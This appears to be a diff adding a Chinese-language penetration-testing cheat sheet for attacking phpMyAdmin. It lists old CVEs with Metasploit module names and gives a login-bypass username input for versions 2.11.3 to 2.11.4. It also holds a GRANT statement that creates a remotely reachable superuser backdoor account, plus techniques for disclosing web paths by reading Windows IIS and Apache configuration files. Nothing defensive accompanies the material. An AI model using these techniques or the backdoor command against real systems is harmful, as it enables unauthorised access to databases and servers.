@@ -1,0 +1,14 @@
+一： 影响版本：3.5.x < 3.5.8.1 and 4.0.0 < 4.0.0-rc3     概述：PhpMyAdmin存在PREG_REPLACE_EVAL漏洞     利用模块：exploit/multi/http/phpmyadmin_preg_replace     CVE: CVE-2013-3238
+二： 影响版本：phpMyAdmin v3.5.2.2     概述：PhpMyAdmin存在server_sync.php 后门漏洞     利用模块：exploit/multi/http/phpmyadmin_3522_backdoor     CVE: CVE-2012-5159
+三： 影响版本： 2.11.x    < 2.11.9.5 and 3.x < 3.1.3.1;     概述：PhpMyAdmin配置文件/config/config.inc.php存在命令执行     利用模块：exploit/unix/webapp/phpmyadmin_config     CVE: CVE-2009-1151
+ 4.  影响版本：phpmyadmin 2.11.3--phpmyadmin 2.11.4利用方式：直接在phpmyadmin的用户名内填入：  密码空 'localhost'@'@" 复制代码
+ 5. phpMyAdmin < 3.3.10.2 || phpMyAdmin < 3.4.3.1    phpMyAdmin 3.x Swekey远程代码注入攻击
+ 6. phpmyadmin 2.80 反序列 lfi、 rfi包含 漏洞文件 ss phpmyadmin一句话开启外链mysql ：添加超级用户guetsec密码ooxx并且允许外连  GRANT ALL PRIVILEGES ON *.* TO 'guetsec'@'%' IDENTIFIED BY 'ooxx' WITH GRANT OPTION; phpmyadmin
+
+ 暴绝对路径：
+ 1. 用Web路径自动盲爆工具 V2.0 乌云内测（带字典）.rar
+ 2.扫phpinfo.php  info.php  php.php  test.php等等
+ 3. 上传图片 超长文件名！
+ 4.phpmyadmin构造xml上传暴路径
+ 5.phpmyadmin读取系统文件cmd爆路径！
+ 6.phpmyadmin读取 iis6，iis7配置文件  读取apache  Nginx 配置文件！ windows2003 iis6配置文件所在位置C:\Windows/system32\inetsrv\metabase.xml win2008/2012 iis7.5 在这个文件C:\Windows\System32\inetsrv\config\applicationHost.config  apache配置：/etc/httpd/conf/httpd.conf
